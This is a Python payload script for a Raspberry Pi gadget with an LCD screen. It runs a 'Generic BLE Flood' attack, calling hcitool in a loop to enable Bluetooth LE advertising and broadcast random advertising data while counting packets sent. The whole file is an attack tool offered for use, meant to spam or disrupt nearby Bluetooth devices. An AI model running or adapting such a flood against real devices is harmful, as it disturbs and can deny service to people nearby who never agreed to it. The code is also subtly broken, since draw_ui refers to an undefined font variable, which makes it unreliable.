#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
import threading
import random
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)

HCI_INTERFACE = "hci0"
running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(status: str):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Generic BLE Flood", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 35), status, font=FONT_STATUS, fill=status_color)
    d.text((5, 60), "Packets Sent:", font=FONT, fill="white")
    d.text((15, 75), str(packet_count), font=FONT_TITLE, fill="yellow")
    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def ble_flood_worker():
    global packet_count
    
    while not attack_stop_event.is_set():
        payload_len = random.randint(2, 31)
        payload = " ".join([f"{random.randint(0, 255):02x}" for _ in range(payload_len)])
        
        cmd = f"hcitool -i {HCI_INTERFACE} cmd 0x08 0x0008 {payload}"
        
        try:
            subprocess.run(cmd, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            packet_count += 1
        except subprocess.CalledProcessError:
            pass
        
        time.sleep(0.1)

def start_attack():
    global attack_thread, packet_count
    if not (attack_thread and attack_thread.is_alive()):
        packet_count = 0
        attack_stop_event.clear()
        
        subprocess.run(f"hcitool -i {HCI_INTERFACE} cmd 0x08 0x000a 01", shell=True)
        
        attack_thread = threading.Thread(target=ble_flood_worker, daemon=True)
        attack_thread.start()

def stop_attack():
    attack_stop_event.set()
    subprocess.run(f"hcitool -i {HCI_INTERFACE} cmd 0x08 0x000a 00", shell=True)
    if attack_thread:
        attack_thread.join(timeout=2)

if __name__ == "__main__":
    try:
        is_attacking = False
        if subprocess.run("which hcitool", shell=True, capture_output=True).returncode != 0:
            draw_ui("hcitool not found!")
            time.sleep(3)
            raise SystemExit("hcitool not found.")

        while running:
            draw_ui("ACTIVE" if is_attacking else "STOPPED")
            
            start_wait = time.time()
            while time.time() - start_wait < 1.0:
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                if GPIO.input(PINS["OK"]) == 0:
                    is_attacking = not is_attacking
                    if is_attacking:
                        start_attack()
                    else:
                        stop_attack()
                    time.sleep(0.3)
                    break
                time.sleep(0.05)
            if not running: break
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("BLE Flood payload finished.")